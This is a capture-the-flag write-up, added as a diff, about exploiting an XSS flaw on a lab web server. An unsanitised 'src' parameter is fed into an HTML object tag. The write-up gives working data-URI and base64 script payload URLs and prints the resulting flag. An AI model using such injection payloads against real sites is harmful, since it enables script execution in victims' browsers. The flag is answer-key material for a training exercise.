@@ -1,0 +1,30 @@
+In the home page, there is one nsa clickable picture that goes to : 
+http://172.16.91.134/?page=media&src=nsa
+
+If you replace the "nsa" in the url, the image is replaced by an integration of the home page.
+
+This HTML element is an "object" like this :
+<object data="XXXX">
+<!-- Content from data goes here -->
+</object>
+
+If the url parameter isn't "nsa", the content of the parameter directly goes in the data property of the object.
+
+From this source, we'll learn that we can forge an URL to add an XSS :
+https://owasp.org/www-community/attacks/xss/
+
+We first try this url to demonstrate that we can inject any data from the URL :
+
+http://172.16.91.134/?page=media&src=data:text/html,<b>hello</b>
+
+Now if we replace the html by a simple js code :
+
+http://172.16.91.134/?page=media&src=data:text/html,%3Cscript%3Ealert(%27darkly%20is%20partly%20good%27)%3C/script%3E
+
+With this URL, the JS code is well executed.
+
+For any reason, this project wants a base64 encoded JS code, so here is the same behavior but with a different URL :
+
+http://172.16.91.134/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGFya2x5IGlzIHBhcnRseSBnb29kJyk8L3NjcmlwdD4
+
+So this URL shows a flag ! : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
